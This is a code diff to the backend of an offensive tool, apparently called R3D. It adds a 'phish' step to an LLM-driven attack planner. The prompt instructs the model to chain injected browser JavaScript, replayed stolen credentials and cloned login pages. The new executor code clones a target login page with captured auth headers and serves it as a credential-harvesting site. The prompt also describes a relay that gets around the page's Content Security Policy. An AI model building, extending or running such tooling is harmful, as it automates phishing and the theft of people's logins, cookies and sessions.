@@ -277,11 +277,17 @@ async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Req
         f"AVAILABLE CREDENTIALS:\n{json.dumps(cred_summary, default=str)}\n\n"
         + (f"ATTACK GRAPH:\n{graph_summary}\n\n" if graph_summary else "")
         + (f"CONFIRMED PIVOT RESULTS:\n{pivot_summary}\n\n" if pivot_summary else "")
-        + 'Each step is either:\n'
+        + 'Each step is one of:\n'
         '- "browser": JavaScript snippet injected into the target page via Chrome extension '
         '(MAIN world — full cookie, DOM, localStorage access). '
         'Use console.log("[R3D TEST] ...") for all output.\n'
-        '- "server": HTTP request executed server-side with replayed auth credentials.\n\n'
+        '- "server": HTTP request executed server-side with replayed auth credentials.\n'
+        '- "phish": Clone a target login page as a credential-harvesting phish site. '
+        'The proxy handles EVERYTHING: fetches the page with captured auth context, '
+        'rewrites all URLs, injects credential capture hooks (form submit, password blur, '
+        'fetch/XHR intercept, dynamic form detection, cookie/storage snapshot). '
+        'Just provide the target URL — no JavaScript snippet needed. '
+        'Output is the victim-facing serve URL. Use this for social engineering steps.\n\n'
         "CSP-SAFE PROXY RELAY FOR BROWSER STEPS:\n"
         "The target page's CSP BLOCKS fetch() to arbitrary origins. Browser snippets MUST use "
         "window.__r3d_proxy(endpoint, body) instead of fetch() to reach the proxy. This relay "
@@ -289,11 +295,13 @@ async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Req
         "  await window.__r3d_proxy('r3d/test/beacon', {data: 'proof'})\n"
         "  await window.__r3d_proxy('r3d/attack/fetch', {url, method, headers, body})\n"
         "  await window.__r3d_proxy('r3d/attack/validate-token', {accessToken, userinfoUrl, headers})\n"
+        "  await window.__r3d_proxy('r3d/attack/phish/clone', {url, useAuthContext: true})\n"
         "NEVER use fetch() to reach the proxy in browser snippets. ALWAYS use window.__r3d_proxy().\n\n"
         "RULES:\n"
         "- Earlier steps can extract data that later steps use. "
         "Reference prior step output with {{step.N.output}} placeholders.\n"
         "- Prefer server-side when the attack doesn't require DOM access.\n"
+        "- Use phish steps when the objective involves credential harvesting or social engineering.\n"
         "- Each step MUST have clear success/failure criteria.\n"
         f"- Maximum {body.maxSteps} steps. Prioritize by impact.\n\n"
         "Return valid JSON with these keys:\n"
@@ -301,11 +309,12 @@ async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Req
         '"summary" — 2-3 sentence description of the attack chain\n'
         '"steps" — array of objects, each with:\n'
         '  "index" — step number (0-based)\n'
-        '  "type" — "browser" or "server"\n'
+        '  "type" — "browser", "server", or "phish"\n'
         '  "target" — full URL or origin\n'
         '  "objective" — what this step proves or extracts\n'
         '  "snippet" — (browser only) JavaScript to inject\n'
         '  "request" — (server only) object with "method", "url", "sourceOrigin" (whose creds to use), optional "body"\n'
+        '  "phishTarget" — (phish only) full URL to clone as credential-harvesting page\n'
         '  "successCriteria" — string describing what output means success\n'
         '  "feedsInto" — array of step indexes that depend on this step\'s output\n'
     )
@@ -400,6 +409,58 @@ async def execute_attack_plan(sid: str, body: PlanExecuteRequest, request: Reque
                     result["output"] = ""
                     result["error"] = "Timed out waiting for extension to execute"
                     result["status"] = "timeout"
+
+            elif step_type == "phish":
+                from uuid import uuid4
+                from routers.phish import PHISH_CACHE_ROOT, _clone_page
+
+                phish_url = step.get("phishTarget") or target
+                try:
+                    p = urlparse(phish_url)
+                    phish_origin = f"{p.scheme}://{p.netloc}"
+                except Exception:
+                    phish_origin = ""
+
+                replay_headers = get_replay_headers(phish_origin, {})
+                phish_site_id = uuid4().hex[:8]
+                cache_dir = PHISH_CACHE_ROOT / phish_site_id
+                assets_dir = cache_dir / "assets"
+                assets_dir.mkdir(parents=True, exist_ok=True)
+
+                try:
+                    info = await _clone_page(
+                        phish_url, phish_origin, replay_headers,
+                        phish_site_id, cache_dir, assets_dir,
+                    )
+                    serve_url = f"/p/{phish_site_id}/"
+                    state.phish_sites[phish_site_id] = {
+                        "siteId": phish_site_id,
+                        "targetUrl": phish_url,
+                        "targetOrigin": phish_origin,
+                        "clonedAt": now().isoformat(),
+                        "assetsCloned": info["assetsCloned"],
+                        "formsDetected": info["formsDetected"],
+                        "captured": [],
+                    }
+                    result["output"] = serve_url
+                    result["status"] = "success"
+                    result["phishSiteId"] = phish_site_id
+                    result["assetsCloned"] = info["assetsCloned"]
+                    result["formsDetected"] = info["formsDetected"]
+
+                    broadcast("phish_cloned", {
+                        "siteId": phish_site_id,
+                        "targetUrl": phish_url,
+                        "serveUrl": serve_url,
+                        "assetsCloned": info["assetsCloned"],
+                        "formsDetected": info["formsDetected"],
+                    })
+                except Exception as exc:
+                    import shutil
+                    shutil.rmtree(cache_dir, ignore_errors=True)
+                    result["output"] = ""
+                    result["error"] = str(exc)
+                    result["status"] = "error"
 
             else:
                 req = resolved_request
